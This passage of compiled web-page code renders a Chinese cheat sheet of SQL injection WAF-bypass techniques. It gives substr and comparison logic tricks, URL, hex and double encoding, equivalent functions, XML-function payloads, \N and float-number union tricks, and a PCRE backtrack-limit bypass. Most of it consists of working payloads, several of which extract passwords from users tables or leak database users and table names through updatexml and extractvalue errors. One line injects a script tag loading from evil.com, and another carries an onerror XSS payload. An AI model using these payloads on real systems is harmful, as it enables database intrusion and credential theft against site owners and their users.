<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">绕过方式 </span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> &amp;&amp; substr(user,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">) </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> lower</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">(conv(</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">11</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">10</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">16</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">)) #十进制的11转化为十六进制，并小写。</span></span></code></pre></div><h4 id="过滤substr" tabindex="-1">过滤substr <a class="header-anchor" href="#过滤substr" aria-label="Permalink to &quot;过滤substr&quot;">​</a></h4><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">逻辑绕过</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">过滤代码 </span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> &amp;&amp; substr(user,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">) </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> lower</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">(conv(</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">11</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">10</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">16</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">)) </span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">绕过方式 </span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> &amp;&amp; lpad(user(),</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">) </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">in</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> &#39;r&#39;</span></span></code></pre></div><h4 id="编码绕过" tabindex="-1">编码绕过 <a class="header-anchor" href="#编码绕过" aria-label="Permalink to &quot;编码绕过&quot;">​</a></h4><p>利用urlencode，ascii(char)，hex，unicode等编码绕过</p><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">or</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 1</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">1即%6f%</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">72</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">%</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">20</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">%</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">31</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">%3d%</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">31</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">，而Test也可以为CHAR(</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">101</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">)</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">+CHAR</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">(</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">97</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">)</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">+CHAR</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">(</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">115</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">)</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">+CHAR</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">(</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">116</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">)。</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">十六进制编码</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">SELECT</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">双重编码绕过</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">?id</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">%252f%252a</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">*/UNION</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">%252f%252a </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">/SELECT</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">%252f%252a</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">*/</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">2</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">password</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">%252f%252a</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">*/FROM</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">%252f%252a</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">*/</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">Users</span><span style="--shiki-light:#6A737D;--shiki-dark:#768390;">--+</span></span></code></pre></div><h4 id="等价函数或变量" tabindex="-1">等价函数或变量 <a class="header-anchor" href="#等价函数或变量" aria-label="Permalink to &quot;等价函数或变量&quot;">​</a></h4><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">hex()、bin() </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">==&gt;</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> ascii</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">sleep() </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">==&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">benchmark()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">concat_ws()</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">==&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">group_concat()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">mid()、substr() </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">==&gt;</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> substring</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">@@user </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">==&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> user()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">@@datadir </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">==&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> datadir()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">举例：</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">substring</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">()和substr()无法使用时：?id</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> and</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> ascii</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">(</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">lower</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">(mid((</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">select</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> pwd </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">from</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> users </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">limit</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">),</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">)))</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">74</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">　</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">或者：</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">substr((</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">select</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> &#39;password&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">),</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">) </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> 0x70</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">strcmp(</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">left</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">&#39;password&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">), 0x69) </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 1</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">strcmp(</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">left</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">&#39;password&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">), 0x70) </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 0</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">strcmp(</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">left</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">&#39;password&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">), 0x71) </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> -</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span></span></code></pre></div><h4 id="生僻函数" tabindex="-1">生僻函数 <a class="header-anchor" href="#生僻函数" aria-label="Permalink to &quot;生僻函数&quot;">​</a></h4><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">MySQL</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">/</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">PostgreSQL支持XML函数：</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">Select</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> UpdateXML(‘</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">&lt;</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">script x</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">_</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">&gt;&lt;/</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">script</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> ’,’</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">/</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">script</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">/</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">@x</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">/</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">’,’src</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=//</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">evil</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">.</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">com</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">’);　　　　　　　　　　</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">?id</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> and</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 1</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">(updatexml(</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">concat</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">(0x3a,(</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">select</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> user())),</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">))</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">SELECT</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> xmlelement(</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">name</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> img,xmlattributes(1as src,</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">&#39;a\\l\\x65rt(1)&#39;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">as</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> \\117n\\x65rror));　</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">//</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">postgresql</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">?id</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> and</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> extractvalue(</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">, </span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">concat</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">(0x5c, (</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">select</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> table_name </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">from</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> information_schema</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">.</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">tables</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> limit</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">)));</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">and</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 1</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">(updatexml(</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">concat</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">(0x5c,(</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">select</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> user()),0x5c),</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">))</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">and</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> extractvalue(</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">, </span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">concat</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">(0x5c, (</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">select</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> user()),0x5c))</span></span></code></pre></div><h4 id="n绕过" tabindex="-1"><code>\\N</code>绕过 <a class="header-anchor" href="#n绕过" aria-label="Permalink to &quot;\`\\N\`绕过&quot;">​</a></h4><p><code>\\N</code>相当于NULL字符</p><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">select</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> *</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> from</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> users </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">where</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> id</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">8E0union </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">select</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">2</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">3</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">4</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">5</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">6</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">7</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">8</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">9</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">0</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">select</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> *</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> from</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> users </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">where</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> id</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">8</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">.0union </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">select</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">2</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">3</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">4</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">5</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">6</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">7</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">8</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">9</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">0</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">select</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> *</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> from</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> users </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">where</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> id</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">\\Nunion </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">select</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">2</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">3</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">4</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">5</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">6</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">7</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">8</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">9</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">0</span></span></code></pre></div><h4 id="pcre绕过" tabindex="-1">PCRE绕过 <a class="header-anchor" href="#pcre绕过" aria-label="Permalink to &quot;PCRE绕过&quot;">​</a></h4><div class="language-SQL注入绕过速查表 vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">SQL注入绕过速查表</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span>PHP 的 pcre.backtrack_limit 限制利用</span></span>
<span class="line"><span>union/*aaaaaaaxN*/select</span></span></code></pre></div>`,218);function B(s,u,m,E,b,v){const l=p,k=e("ClientOnly");return h(),d("div",null,[D,r(k,null,{default:g(()=>{var i,a;return[(((i=s.$frontmatter)==null?void 0:i.aside)??!0)&&(((a=s.$frontmatter)==null?void 0:a.showArticleMetadata)??!0)?(h(),C(l,{key:0,article:s.$frontmatter},null,8,["article"])):A("",!0)]}),_:1}),o])}const S=t(c,[["render",B]]);export{x as __pageData,S as default};
